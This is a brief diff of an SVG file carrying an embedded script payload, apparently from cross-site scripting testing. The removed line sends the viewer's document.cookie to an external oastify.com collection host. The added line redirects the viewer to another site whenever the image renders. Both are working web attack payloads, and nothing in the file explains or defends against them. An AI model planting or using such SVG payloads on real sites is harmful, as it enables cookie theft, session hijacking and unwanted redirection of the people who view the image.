@@ -1,5 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    new Image().src='https://vji93za3mlf21j0x1ab2pz2ktbz2nsbh.oastify.com/?c='+document.cookie;
+    window.location = "https://bing.com"
   </script>
 </svg>
